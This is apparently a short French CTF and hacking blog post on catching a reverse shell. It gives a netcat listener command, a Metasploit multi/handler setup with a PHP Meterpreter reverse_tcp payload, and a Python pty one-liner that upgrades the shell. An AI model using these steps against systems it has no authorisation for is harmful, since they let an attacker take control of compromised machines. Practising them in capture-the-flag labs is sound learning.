---
layout: post
section-type: post
title: Se mettre sous écoute sur un port
category: exploitation web
tags: [ 'reverse_shell', 'web', 'hacking', 'ctf' ]
---

---------------------------------------------
#### Mise en garde
Dans cet article, je vous montre un simple usage de netcat et meterpreter. Pour aller plus loin, RTFM :p 

---------------------------------------------

#### Pré requis 
1-Avoir installer meterpreter pour la Méthode 2 <br/>

---------------------------------------------
#### Méthode 1: Utiliser netcat
  <pre><code data-trim class="yaml">
      #se mettre sous écoute sur le port 1234
      netcat -lvp 1234 
  </code></pre> <br/>
  
  NB: Il n’est pas nécessaire d’avoir les droits "root" pour mettre un port en écoute !
  
---------------------------------------------
#### Méthode 2: Utiliser meterpreter
  <pre><code data-trim class="yaml">
      #se mettre sous écoute en utilisant le payload php msfconsole
      use exploit/multi/handler
      set payload php/meterpreter/reverse_tcp
      set LHOST 10.23.201.17
      set LPORT 1234
      run
  </code></pre> <br/>
     
  NB: Il n’est pas nécessaire d’avoir les droits "root" pour mettre un port en écoute !
  
---------------------------------------------
#### Aller plus loin
  <pre><code data-trim class="yaml">
    #Faire en sorte que le shell gère les entrées/sorties sans broncher ;)
    python -c 'import pty; pty.spawn("/bin/bash")' 
  </code></pre> <br/>
 
 ---------------------------------------------
